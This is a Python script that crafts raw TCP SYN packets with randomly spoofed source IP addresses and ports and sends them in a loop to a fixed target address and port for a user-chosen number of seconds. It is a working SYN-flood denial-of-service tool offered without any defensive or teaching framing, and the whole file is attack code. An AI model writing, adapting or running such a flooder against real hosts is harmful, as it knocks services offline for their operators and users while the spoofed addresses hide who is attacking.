import socket, sys, time
from struct import *
from random import randint
import random


class TCP_packet:
    def __init__(self, source_ip = '127.0.0.1', dest_ip = '192.168.43.96', source_port = 80, dest_port = 3000):
        self.source_ip = source_ip
        self.dest_ip = dest_ip
        self.source_port = source_port
        self.dest_port = dest_port
        self.packet = ''

        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            '''
            AF_INET : IPv4 address Family
            SOCK_RAW : use raw socket to control headers of packet
            IPPROTO_RAW : use raw ip protocol
            '''
        except:
            print('error occured')
            sys.exit()

    def checksum(self, msg):
        s = 0

        for i in range(0, len(msg), 2):
            if (i+1) < len(msg):
                a = msg[i]
                b = msg[i+1]
                s = s + (a+(b << 8))
            elif (i+1) == len(msg[i]):
                s += msg[i]


        s = (s>>16) + (s & 0xffff)
        s = s + (s >> 16)

        s = ~s & 0xffff

        return s
    '''
    making packet and adding tcp_headers
    '''
    def makePacket(self):
        # ip header fields
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0  # kernel will fill the correct total length
        ip_id = 54321   #Id of this packet
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP #use TCP protocol
        ip_check = 0    # kernel will fill the correct checksum
        ip_saddr = socket.inet_aton ( self.source_ip )   #Spoof the source ip address if you want to
        ip_daddr = socket.inet_aton ( self.dest_ip )

        ip_ihl_ver = (ip_ver << 4) + ip_ihl

        # the ! in the pack format string means network order
        ip_header = pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

        # tcp header fields
        tcp_seq = 454
        tcp_ack_seq = 0
        tcp_doff = 5    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
        #tcp flags
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons (5840)    #   maximum allowed window size
        tcp_check = 0
        tcp_urg_ptr = 0

        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5) #shift & plus = concat

        # the ! in the pack format string means network order
        tcp_header = pack('!HHLLBBHHH' , self.source_port, self.dest_port, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window, tcp_check, tcp_urg_ptr)

        # pseudo header fields
        source_address = socket.inet_aton(self.source_ip)
        dest_address = socket.inet_aton(self.dest_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        # tcp_length = len(tcp_header) + len(user_data)
        tcp_length = len(tcp_header)

        psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length)
        # psh = psh + tcp_header +bytes(user_data, 'utf-8');
        psh = psh + tcp_header

        tcp_check = self.checksum(bytearray(psh))

        # make the tcp header again and fill the correct checksum - remember checksum is NOT in network byte order
        tcp_header = pack('!HHLLBBH' , self.source_port, self.dest_port, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window) + pack('H' , tcp_check) + pack('!H' , tcp_urg_ptr)

        self.packet = ip_header + tcp_header
        return

    '''
    generating random ip & port# and make packet with it. 
    '''
    def random_source(self):
        bits = random.getrandbits(32)
        self.source_ip = str(randint(0,255)) + '.' + str(randint(0,255)) + '.' + str(randint(0,255)) + '.' + str(randint(0,255))
        self.source_port = randint(0,9999)
        #print(addr_str)
        self.makePacket()
        return

    def send_socket(self):
        self.socket.sendto(self.packet, (self.dest_ip, self.dest_port))

if __name__ == "__main__":
    tcp = TCP_packet()

    end = input('How much seconds do you want?')
    start = time.time()
    end = start + float(end)

    count = 0

    #do until time over
    while True:
        if time.time() > end:
            break
        tcp.random_source()
        tcp.send_socket()
        count += 1

    print(str(count) + " packets are sent")
